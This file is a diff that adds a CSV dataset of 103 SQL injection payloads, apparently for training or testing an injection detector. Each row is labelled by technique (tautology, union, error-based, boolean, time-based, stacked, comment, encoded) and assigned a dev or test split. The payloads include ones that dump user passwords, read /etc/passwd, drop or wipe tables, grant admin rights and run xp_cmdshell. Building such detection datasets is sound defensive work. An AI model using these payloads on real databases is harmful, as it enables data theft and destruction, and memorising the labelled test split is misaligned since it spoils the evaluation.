@@ -1,0 +1,104 @@
+id,input,label,category,split
+a001,' OR '1'='1,attack,tautology,test
+a002,' OR 1=1 -- ,attack,tautology,dev
+a003,admin' -- ,attack,tautology,test
+a004,' OR 'a'='a,attack,tautology,test
+a005,""") OR (""1""=""1",attack,tautology,dev
+a006,' OR 1=1#,attack,tautology,dev
+a007,1' OR '1'='1,attack,tautology,dev
+a008,' OR 1=1 LIMIT 1 -- ,attack,tautology,dev
+a009,""" OR """"=""",attack,tautology,test
+a010,') OR ('x'='x,attack,tautology,dev
+a011,' OR 'x'='x' -- ,attack,tautology,test
+a012,or 1=1,attack,tautology,dev
+a013,' OR 1 -- ,attack,tautology,test
+a014,' UNION SELECT NULL -- ,attack,union,dev
+a015,"' UNION SELECT username, password FROM users -- ",attack,union,test
+a016,"' UNION ALL SELECT NULL,NULL -- ",attack,union,test
+a017,"' UNION SELECT 1,2,3 -- ",attack,union,test
+a018,"-1 UNION SELECT 1,2,3",attack,union,dev
+a019,"' UNION SELECT table_name,NULL FROM information_schema.tables -- ",attack,union,dev
+a020,' UNION SELECT @@version -- ,attack,union,dev
+a021,"' UNION SELECT NULL,concat(username,0x3a,password) FROM users -- ",attack,union,test
+a022,"' UNION DISTINCT SELECT 1,2 -- ",attack,union,dev
+a023,0' UNION SELECT schema_name FROM information_schema.schemata -- ,attack,union,test
+a024,"' UNION SELECT NULL,NULL,NULL,NULL -- ",attack,union,dev
+a025,1 UNION SELECT load_file('/etc/passwd'),attack,union,test
+a026,"' UNION SELECT user(),database(),version() -- ",attack,union,dev
+a027,"' AND extractvalue(1,concat(0x7e,version())) -- ",attack,error,test
+a028,"' AND updatexml(1,concat(0x7e,(SELECT database())),1) -- ",attack,error,dev
+a029,"' AND (SELECT 1 FROM(SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) -- ",attack,error,dev
+a030,"' AND extractvalue(1,concat(0x7e,(SELECT user()))) -- ",attack,error,test
+a031,"' procedure analyse(extractvalue(1,concat(0x7e,version())),1) -- ",attack,error,dev
+a032,' AND exp(~(SELECT * FROM(SELECT version())x)) -- ,attack,error,test
+a033,"' OR 1 GROUP BY concat(version(),floor(rand(0)*2)) HAVING min(0) -- ",attack,error,test
+a034,"' AND gtid_subset(version(),1) -- ",attack,error,test
+a035,"' AND 1=convert(int,(SELECT @@version)) -- ",attack,error,dev
+a036,' AND json_keys((SELECT version())) -- ,attack,error,dev
+a037,"' AND extractvalue(1,concat(0x5c,(SELECT table_name FROM information_schema.tables LIMIT 1))) -- ",attack,error,dev
+a038,' AND 1=cast((SELECT version()) as int) -- ,attack,error,dev
+a039,' AND 1=utl_inaddr.get_host_address((SELECT user FROM dual)) -- ,attack,error,test
+a040,' AND 1=1 -- ,attack,boolean,test
+a041,' AND 1=2 -- ,attack,boolean,dev
+a042,"1 AND substring(version(),1,1)='8'",attack,boolean,dev
+a043,"' AND (SELECT substring(username,1,1) FROM users LIMIT 1)='a' -- ",attack,boolean,dev
+a044,' AND length(database())>5 -- ,attack,boolean,test
+a045,"' AND ascii(substr((SELECT database()),1,1))>64 -- ",attack,boolean,test
+a046,' OR exists(SELECT * FROM users) -- ,attack,boolean,test
+a047,' AND (SELECT count(*) FROM users)>0 -- ,attack,boolean,test
+a048,' AND 1=(SELECT 1 FROM users WHERE username='admin') -- ,attack,boolean,test
+a049,1' AND '1'='2,attack,boolean,dev
+a050,"' AND substring((SELECT password FROM users LIMIT 1),1,1)>'a' -- ",attack,boolean,dev
+a051,' AND user() LIKE 'root%' -- ,attack,boolean,dev
+a052,' AND (SELECT count(*) FROM information_schema.columns)>100 -- ,attack,boolean,dev
+a053,' OR sleep(5) -- ,attack,time,test
+a054,' AND sleep(5) -- ,attack,time,dev
+a055,1 AND sleep(5),attack,time,test
+a056,'; WAITFOR DELAY '0:0:5' -- ,attack,time,dev
+a057,"' OR benchmark(10000000,sha1(1)) -- ",attack,time,test
+a058,"' AND IF(1=1,sleep(5),0) -- ",attack,time,test
+a059,' RLIKE sleep(5) -- ,attack,time,dev
+a060,' AND (SELECT * FROM (SELECT(sleep(5)))a) -- ,attack,time,test
+a061,1)) OR sleep(5)#,attack,time,dev
+a062,' OR pg_sleep(5) -- ,attack,time,test
+a063,'; SELECT pg_sleep(5) -- ,attack,time,dev
+a064,"' AND IF(substring(user(),1,1)='r',sleep(5),0) -- ",attack,time,dev
+a065,' || (SELECT sleep(5)) || ',attack,time,dev
+a066,'; DROP TABLE users -- ,attack,stacked,test
+a067,"'; INSERT INTO users VALUES ('x','y') -- ",attack,stacked,dev
+a068,1; DROP TABLE products,attack,stacked,dev
+a069,'; UPDATE users SET is_admin=1 WHERE username='alice' -- ,attack,stacked,dev
+a070,'; DELETE FROM secrets -- ,attack,stacked,test
+a071,'; EXEC xp_cmdshell('whoami') -- ,attack,stacked,dev
+a072,'; CREATE USER hacker -- ,attack,stacked,test
+a073,'; SHUTDOWN -- ,attack,stacked,test
+a074,1; SELECT sleep(5),attack,stacked,test
+a075,'; TRUNCATE TABLE logs -- ,attack,stacked,dev
+a076,'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' -- ,attack,stacked,dev
+a077,'; ALTER TABLE users ADD COLUMN pwned int -- ,attack,stacked,test
+a078,"'; INSERT INTO secrets(name,value) VALUES('x','y') -- ",attack,stacked,dev
+a079,'/**/OR/**/1=1 -- ,attack,comment,test
+a080,admin'#,attack,comment,test
+a081,' OR 1=1-- -,attack,comment,dev
+a082,"UNION/**/SELECT/**/1,2",attack,comment,test
+a083,' OR/**/'1'='1,attack,comment,test
+a084,"/*!50000UNION*/ /*!50000SELECT*/ 1,2",attack,comment,test
+a085,' OR 1=1 -- comment,attack,comment,dev
+a086,';-- ,attack,comment,dev
+a087,' UNION/**/SELECT/**/NULL-- ,attack,comment,dev
+a088,'/*!50000 OR */1=1-- ,attack,comment,dev
+a089,'-- -,attack,comment,test
+a090,' OR/*x*/1/*y*/=/*z*/1 -- ,attack,comment,dev
+a091,' OR 1=1;#,attack,comment,dev
+a092,%27%20OR%201=1--,attack,encoded,test
+a093,%2527%20OR%201=1--,attack,encoded,test
+a094,' OR 0x31=0x31 -- ,attack,encoded,dev
+a095,"uNiOn sElEcT 1,2",attack,encoded,dev
+a096,' OR char(49)=char(49) -- ,attack,encoded,dev
+a097,"%55NION%20%53ELECT%201,2",attack,encoded,test
+a098,' oR 1=1%23,attack,encoded,dev
+a099,＇ OR 1=1 -- ,attack,encoded,test
+a100,0x27206f7220313d3120,attack,encoded,test
+a101,%2555NION %2553ELECT,attack,encoded,dev
+a102,%27%20OR%20%271%27%3D%271,attack,encoded,test
+a103,0x756e696f6e2073656c656374,attack,encoded,dev
